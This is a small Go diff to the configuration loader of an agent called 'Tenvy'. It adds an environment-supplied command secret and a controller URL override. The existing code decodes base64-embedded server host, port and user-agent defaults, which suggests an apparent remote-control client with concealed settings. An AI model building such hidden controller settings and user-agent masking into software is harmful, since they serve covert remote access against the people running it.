@@ -55,6 +55,7 @@ func loadRuntimeOptions(logger *log.Logger) (agent.RuntimeOptions, error) {
 	runtimeConfig := parseEmbeddedRuntimeConfig(logger, defaultRuntimeConfigEncoded)
 
 	userAgent := strings.TrimSpace(fallback(os.Getenv("TENVY_USER_AGENT"), decodeBase64(defaultUserAgentOverrideEncoded)))
+	commandSecret := strings.TrimSpace(os.Getenv("TENVY_COMMAND_SECRET"))
 
 	return agent.RuntimeOptions{
 		Logger:            logger,
@@ -70,10 +71,15 @@ func loadRuntimeOptions(logger *log.Logger) (agent.RuntimeOptions, error) {
 		CustomHeaders:     runtimeConfig.Headers,
 		CustomCookies:     runtimeConfig.Cookies,
 		EnabledModules:    runtimeConfig.Modules,
+		CommandSecret:     commandSecret,
 	}, nil
 }
 
 func defaultServerURL() string {
+	if env := strings.TrimSpace(os.Getenv("TENVY_CONTROLLER_BASE_URL")); env != "" {
+		return env
+	}
+
 	host := strings.TrimSpace(fallback(decodeBase64(defaultServerHostEncoded), "localhost"))
 	port := strings.TrimSpace(fallback(decodeBase64(defaultServerPortEncoded), "2332"))
 
